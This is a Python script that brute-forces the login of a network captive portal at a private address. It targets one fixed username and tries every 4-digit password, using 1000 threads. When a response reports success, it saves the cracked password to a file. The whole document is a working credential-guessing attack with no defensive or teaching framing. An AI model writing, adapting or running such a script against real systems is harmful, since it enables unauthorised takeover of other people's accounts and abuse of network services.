import requests, threading, time, random
reqs = requests.session()
class DIC:
    dictionarys = []
Dic = DIC()

username = 1911020
def randomNumber(main,length,Dic):
    x = main
    while(True):
        if len(Dic.dictionarys)==10**length:break
        if(len(main)==length):
            if main not in Dic.dictionarys:
                Dic.dictionarys.append(main)
                # threading.Thread(target=run,args=(main,Dic,)).start()
                return main
            else:
                main = x
        main += random.choice("0123456789")

def getRun():
    df = open('x.txt', 'r', encoding='utf-8')
    return df.read()
def setRun(x):
    df = open('x.txt', 'w')
    df.writelines(str(x))
    df.close()
def result(x):
    df = open('result.txt', 'w')
    df.writelines(str(x))
    df.close()

def run(password,Dic):
    print(f"count Password : ${len(Dic.dictionarys)}")
    url = "http://172.16.0.1/portal/user-authen.php"
    header = {
        "content-type":"application/x-www-form-urlencoded"
    }
    body = {
        "txtLogin":username,
        "txtPasswd":password,
        "btnLogin":"Login",
        "reqUrl":"",
        "reqCheck":"false"
    }
    try:
        res = reqs.post(url=url,headers=header,data=body)
        if "Login successfully" in res.text or "You are currently online" in res.text:
            print(f"Login successfully Password is ${password}")
            result(f'usename : {username}, password : ${password}')
            setRun(0)
    except:
        pass
def start(Dic):
    time.sleep(0.1)
    length = 4
    while(True):
        if len(Dic.dictionarys)==10**length:break
        run(randomNumber("",length,Dic),Dic)
for i in range(1000):
    # threading.Thread(target=run,args=(randomNumber("",4,Dic),Dic,)).start()
    threading.Thread(target=start,args=(Dic,)).start()